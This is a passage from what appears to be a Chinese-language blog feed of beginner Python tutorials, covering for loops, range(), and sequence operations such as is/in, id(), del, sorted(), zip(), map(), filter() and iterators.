</span><br><span class="line">1 * 7 = 7 2 * 7 = 14 3 * 7 = 21 4 * 7 = 28 5 * 7 = 35 6 * 7 = 42 7 * 7 = 49 </span><br><span class="line">1 * 8 = 8 2 * 8 = 16 3 * 8 = 24 4 * 8 = 32 5 * 8 = 40 6 * 8 = 48 7 * 8 = 56 8 * 8 = 64 </span><br><span class="line">1 * 9 = 9 2 * 9 = 18 3 * 9 = 27 4 * 9 = 36 5 * 9 = 45 6 * 9 = 54 7 * 9 = 63 8 * 9 = 72 9 * 9 = 81 </span><br></pre></td></tr></table></figure><h2 id="2-for循环"><a href="#2-for循环" class="headerlink" title="2. for循环"></a>2. for循环</h2><h3 id="2-1-基本结构"><a href="#2-1-基本结构" class="headerlink" title="2.1 基本结构"></a>2.1 基本结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> identifier <span class="keyword">in</span> iterable</span><br><span class="line">    statement_1(s1)</span><br><span class="line">statement_2(s2)</span><br></pre></td></tr></table></figure><blockquote><p>Translation:<br>identifier: 标识符（变量名）<br>iterable: 可迭代对象  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"><span class="comment"># 45</span></span><br></pre></td></tr></table></figure><h3 id="2-2-range-函数"><a href="#2-2-range-函数" class="headerlink" title="2.2 range()函数"></a>2.2 range()函数</h3><blockquote><p>range(stop)<br>range(start, stop)<br>range(start, stop, step)  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">            <span class="keyword">if</span> n % m == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(n, <span class="string">&quot;=&quot;</span>, m, <span class="string">&quot;*&quot;</span>, n // m)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(n, <span class="string">&quot;is a prime number&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2 is a prime number</span><br><span class="line">3 is a prime number</span><br><span class="line">4 = 2 * 2</span><br><span class="line">5 is a prime number</span><br><span class="line">6 = 2 * 3</span><br><span class="line">7 is a prime number</span><br><span class="line">8 = 2 * 4</span><br><span class="line">9 = 3 * 3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-序列</title>
      <link href="/2023/01/20/Python/Python-%E5%BA%8F%E5%88%97/"/>
      <url>/2023/01/20/Python/Python-%E5%BA%8F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>参考资料：<br><a href="https://www.bilibili.com/video/BV1c4411e77t">【Python教程】《零基础入门学习Python》最新版（2022年12月26日更新）</a></p></blockquote><h1 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h1><p>Python中，列表、元组和字符串都属于序列</p><h2 id="1-序列的基本运算"><a href="#1-序列的基本运算" class="headerlink" title="1. 序列的基本运算"></a>1. 序列的基本运算</h2><blockquote><p>加法 +<br>乘法 *  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">c = a + b</span><br><span class="line">d = a * <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 5, 6]</span><br><span class="line">[1, 2, 3, 1, 2, 3]</span><br></pre></td></tr></table></figure><h2 id="2-序列的判定函数"><a href="#2-序列的判定函数" class="headerlink" title="2. 序列的判定函数"></a>2. 序列的判定函数</h2><h3 id="2-1-关键词’is’-amp-‘is-not’"><a href="#2-1-关键词’is’-amp-‘is-not’" class="headerlink" title="2.1 关键词’is’ &amp; ‘is not’"></a>2.1 关键词’is’ &amp; ‘is not’</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a == b?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>) <span class="keyword">if</span> a == b <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a is b?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>) <span class="keyword">if</span> a <span class="keyword">is</span> b <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a == b?</span><br><span class="line">True</span><br><span class="line">a is b?</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>第一次判定的是’a’与’b’的元素值是否相等，而第二次判定的是’a’与’b’是否与同一组数据挂钩<br>放在C语言中，就好比’==’判断变量储存的数值是否相等，而’is’判断他们是否指向同一个内存地址<br>但是在Python中，我们一般认为变量名并不是储存了数据，而是与数据挂钩，同时一般Python也不常用指针的概念<br>这是因为Python对指针做了良好封装，一切都是“对象”，一切对象都有一个“变量”指向它。这个“变量”就是“指针”  </p><blockquote><p>而’is’和’is not’就是用来判断’a’和’b’是否指向了同一个<code>对象</code>，其本质和比较指针是一样的</p></blockquote><h3 id="2-2-id"><a href="#2-2-id" class="headerlink" title="2.2 id()"></a>2.2 id()</h3><blockquote><p>Return the identity of an object.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">b = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>) <span class="keyword">if</span> <span class="built_in">id</span>(a) == <span class="built_in">id</span>(b) <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br><span class="line">c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">d = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>) <span class="keyword">if</span> <span class="built_in">id</span>(c) == <span class="built_in">id</span>(d) <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure><br>id()相当于C语言中取地址符，它得到的相当于与变量名挂钩的数据的”身份证”，只要数据存在于内存中，这个值就唯一</p></blockquote><h3 id="2-3-关键词’in’-amp-‘not-in’"><a href="#2-3-关键词’in’-amp-‘not-in’" class="headerlink" title="2.3 关键词’in’ &amp; ‘not in’"></a>2.3 关键词’in’ &amp; ‘not in’</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">b = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1 in a?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>) <span class="keyword">if</span> <span class="number">1</span> <span class="keyword">in</span> a <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a not in b?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>) <span class="keyword">if</span> a <span class="keyword">not</span> <span class="keyword">in</span> b <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 in a?</span><br><span class="line">True</span><br><span class="line">a not in b?</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="3-关键词’del’"><a href="#3-关键词’del’" class="headerlink" title="3. 关键词’del’"></a>3. 关键词’del’</h2><p>作用：删除<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">del</span> x[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">del</span> x[:<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">del</span> x[:]</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">del</span> x</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4, 5]</span><br><span class="line">[2, 3, 4, 5]</span><br><span class="line">[4, 5]</span><br><span class="line">[]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:\PycharmProjects\test\main.py&quot;, line 10, in &lt;module&gt;</span><br><span class="line">    print(x)</span><br><span class="line">NameError: name &#x27;x&#x27; is not defined</span><br></pre></td></tr></table></figure></p><h2 id="4-序列基本函数"><a href="#4-序列基本函数" class="headerlink" title="4. 序列基本函数"></a>4. 序列基本函数</h2><h3 id="4-1-list-amp-tuple-amp-str"><a href="#4-1-list-amp-tuple-amp-str" class="headerlink" title="4.1 list() &amp; tuple() &amp; str()"></a>4.1 list() &amp; tuple() &amp; str()</h3><blockquote><p>list(iterable)<br>tuple(iterable)<br>str(object) # str(object=’’) -&gt; str  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="string">&quot;Momoyeyu&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(<span class="string">&quot;Momoyeyu&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;Momoyeyu&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">list</span>(<span class="string">&quot;Momoyeyu&quot;</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;M&#x27;, &#x27;o&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;y&#x27;, &#x27;e&#x27;, &#x27;y&#x27;, &#x27;u&#x27;]</span><br><span class="line">(&#x27;M&#x27;, &#x27;o&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;y&#x27;, &#x27;e&#x27;, &#x27;y&#x27;, &#x27;u&#x27;)</span><br><span class="line">Momoyeyu</span><br><span class="line">[&#x27;M&#x27;, &#x27;o&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;y&#x27;, &#x27;e&#x27;, &#x27;y&#x27;, &#x27;u&#x27;]</span><br></pre></td></tr></table></figure><h3 id="4-2-max-amp-min"><a href="#4-2-max-amp-min" class="headerlink" title="4.2 max() &amp; min()"></a>4.2 max() &amp; min()</h3><blockquote><p>max(iterable, *[, default=obj, key=func])<br>min(iterable, *[, default=obj, key=func])<br>注：可选参数default默认是报错，可以设置内容  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>(<span class="string">&quot;Momoyeyu&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>([], default = <span class="string">&quot;Empty!&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">M</span><br><span class="line">Empty!</span><br></pre></td></tr></table></figure><h3 id="4-3-len-amp-sum"><a href="#4-3-len-amp-sum" class="headerlink" title="4.3 len() &amp; sum()"></a>4.3 len() &amp; sum()</h3><blockquote><p>len(obj)<br>sum(iterable, /, start=0)<br>注：可选参数start默认是0，可以设置起始值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">10</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], start=<span class="number">10</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1024</span><br><span class="line">25</span><br></pre></td></tr></table></figure><h3 id="4-4-sorted-amp-reversed"><a href="#4-4-sorted-amp-reversed" class="headerlink" title="4.4 sorted() &amp; reversed()"></a>4.4 sorted() &amp; reversed()</h3><blockquote><p>sorted(iterable, /, *, key=None, reverse=False)<br>reversed(sequence) # Return a reverse iterator over the values of the given sequence.  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>([<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>([<span class="string">&quot;Momoyeyu&quot;</span>, <span class="string">&quot;Gger&quot;</span>, <span class="string">&quot;Guitar&quot;</span>], key=<span class="built_in">len</span>, reverse=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">reversed</span>([<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">reversed</span>([<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>])))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[1, 2, 3, 4]</span><br><span class="line">[&#x27;Momoyeyu&#x27;, &#x27;Guitar&#x27;, &#x27;Gger&#x27;]</span><br><span class="line">&lt;list_reverseiterator object at 0x000002891CDAFE20&gt;</span><br><span class="line">[6, 8, 0, 0, 1]</span><br></pre></td></tr></table></figure><p>由输出第3行我们注意到，reversed()返回的不是一个列表，根据Python官方文档说明，reversed()返回的是一个<code>迭代器</code></p><h3 id="4-5-all-amp-any"><a href="#4-5-all-amp-any" class="headerlink" title="4.5 all() &amp; any()"></a>4.5 all() &amp; any()</h3><blockquote><p>all(iterable)<br>any(iterable)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>([<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">any</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">False</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="5-关于迭代器-iterator"><a href="#5-关于迭代器-iterator" class="headerlink" title="5. 关于迭代器-iterator"></a>5. 关于迭代器-iterator</h2><h3 id="5-1-enumerate"><a href="#5-1-enumerate" class="headerlink" title="5.1 enumerate()"></a>5.1 enumerate()</h3><blockquote><p>enumerate(iterable, start=0) # 返回一个枚举对象<br>注：可选参数start可以设置起始序号  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Kisetsu = [<span class="string">&quot;Haru&quot;</span>, <span class="string">&quot;Natsu&quot;</span>, <span class="string">&quot;Aki&quot;</span>, <span class="string">&quot;Huyu&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">enumerate</span>(Kisetsu))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">enumerate</span>(Kisetsu)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">enumerate</span>(Kisetsu, <span class="number">10</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;enumerate object at 0x0000014117E308C0&gt;</span><br><span class="line">[(0, &#x27;Haru&#x27;), (1, &#x27;Natsu&#x27;), (2, &#x27;Aki&#x27;), (3, &#x27;Huyu&#x27;)]</span><br><span class="line">[(10, &#x27;Haru&#x27;), (11, &#x27;Natsu&#x27;), (12, &#x27;Aki&#x27;), (13, &#x27;Huyu&#x27;)]</span><br></pre></td></tr></table></figure><h3 id="5-2-zip"><a href="#5-2-zip" class="headerlink" title="5.2 zip()"></a>5.2 zip()</h3><blockquote><p>zip(*iterables, strict=False) # Return an iterator  </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x, y = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">z = <span class="built_in">zip</span>(x, y)</span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(z))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;zip object at 0x0000022F43B43040&gt;</span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br></pre></td></tr></table></figure><h3 id="5-3-itertools-zip-longest"><a href="#5-3-itertools-zip-longest" class="headerlink" title="5.3 itertools.zip_longest()"></a>5.3 itertools.zip_longest()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&quot;Momoyeyu&quot;</span>)))</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(itertools.zip_longest([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&quot;Momoyeyu&quot;</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[(1, &#x27;M&#x27;), (2, &#x27;o&#x27;), (3, &#x27;m&#x27;)]</span><br><span class="line">[(1, &#x27;M&#x27;), (2, &#x27;o&#x27;), (3, &#x27;m&#x27;), (None, &#x27;o&#x27;), (None, &#x27;y&#x27;), (None, &#x27;e&#x27;), (None, &#x27;y&#x27;), (None, &#x27;u&#x27;)]</span><br></pre></td></tr></table></figure><p>zip()默认进行的时截短运算，但可以从itertools中引用itertools.zip_longest()来进行保长运算</p><h3 id="5-4-map-amp-filter"><a href="#5-4-map-amp-filter" class="headerlink" title="5.4 map() &amp; filter()"></a>5.4 map() &amp; filter()</h3><blockquote><p>map(func, *iterables)<br>注：func指的是一套运算规则，map()会将*iterables中的对象都按照func进行计算然后返回其结果组成的iterator</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;Momoyeyu&quot;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">pow</span>, [<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>], [<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[77, 111, 109, 111, 121, 101, 121, 117]</span><br><span class="line">[256, 512, 1024]</span><br></pre></td></tr></table></figure><p>由输出第二行可以看出，对于数据长度不同时，map()与zip()相同，选择了截短运算</p><blockquote><p>filter(function or None, iterable)<br>注：和map()类似，但只将结果为True的元素返回到iterator</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="built_in">str</span>.islower, <span class="string">&quot;G-ger&quot;</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;g&#x27;, &#x27;e&#x27;, &#x27;r&#x27;]</span><br></pre></td></tr></table></figure><h2 id="6-迭代器和可迭代对象-iterator-amp-iterable"><a href="#6-迭代器和可迭代对象-iterator-amp-iterable" class="headerlink" title="6. 迭代器和可迭代对象-iterator &amp; iterable"></a>6. 迭代器和可迭代对象-iterator &amp; iterable</h2><blockquote><p>iterator是一次性的，而iterable可以重复使用</p><p>可参考<a href="https://blog.csdn.net/pythonandaiot/article/details/122312616">迭代器和可迭代对象</a></p></blockquote><h3 id="6-1-iterator"><a href="#6-1-iterator" class="headerlink" title="6.1 iterator"></a>6.1 iterator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">y = <span class="built_in">iter</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(y))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(x):</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(y, <span class="string">&quot;Empty&quot;</span>), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(y, <span class="string">&quot;Empty&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;list&#x27;&gt;</span><br><span class="line">&lt;class &#x27;list_iterator&#x27;&gt;</span><br><span class="line">1 2 3 4 5 Empty</span><br></pre></td></tr></table></figure><p>next()函数可以让iterator进行一次迭代，迭代到尽头之后就会报错，可以设置报错内容</p><h3 id="6-2-iterable"><a href="#6-2-iterable" class="headerlink" title="6.2 iterable"></a>6.2 iterable</h3><p>可迭代对象可以理解为可以重复使用的迭代器<br>iterable可以进行迭代，迭代完成后，它又可以被引用，从头进行迭代，因为它的数据还被完整保留着<br>而iterator迭代完成之后，迭代器里的数据就被释放完了，不可再次使用  </p><p>一个迭代器<code>肯定</code>是一个可迭代对象</p><h3 id="6-3-iterator与iterable比较"><a href="#6-3-iterator与iterable比较" class="headerlink" title="6.3 iterator与iterable比较"></a>6.3 iterator与iterable比较</h3><blockquote><p>根据应用场景不同，他们有各自的优劣：<br>iterator: 不会占用太多资源储存数据，他只会由现在的数据迭代计算下一个数据，但这个过程往往是不可逆的，迭代后上一个数据就抛弃了<br>iterable: 可以重复使用，迭代后之前的数据也得到保存，但比较占用资源</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串</title>
      <link href="/2023/01/19/Python/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2023/01/19/Python/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
